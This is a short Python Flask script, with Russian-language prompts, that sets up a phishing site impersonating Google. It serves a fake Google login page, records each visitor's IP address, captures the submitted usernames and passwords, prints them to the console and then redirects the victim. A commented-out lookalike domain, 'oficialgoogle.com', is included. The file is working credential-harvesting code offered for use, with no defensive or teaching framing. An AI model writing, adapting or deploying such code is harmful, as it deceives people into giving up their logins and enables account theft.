from flask import Flask, render_template, request, redirect, url_for
import webbrowser
from threading import Thread

print('Давайте настроим ваш фишинг сайт')
action_url = input('Вставьте сюда ссылку, которая будет перенаправлять пользователя после фишинга: ')

app = Flask(__name__, template_folder='Phishing/templates', subdomain_matching=True)
#app.config['SERVER_NAME'] = 'oficialgoogle.com:5000'
username = None

@app.route("/")
def home():
    user_ip = request.remote_addr
    print(f"User IP address: {user_ip}")
    return render_template('Google.html')

@app.route("/login", methods=["POST"])
def login():
    global username
    username = request.form['username']
    password = request.form['password']
    print('User: ', username)
    print('Password: ', password)
    return redirect(url_for('welcome'))

@app.route("/information")
def welcome():
    #webbrowser.open(action_url)
    return render_template('Blok.html')

def run_server():
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)

if __name__ == '__main__':
    print("Запуск сервера...")
    server_thread = Thread(target=run_server)
    server_thread.start()
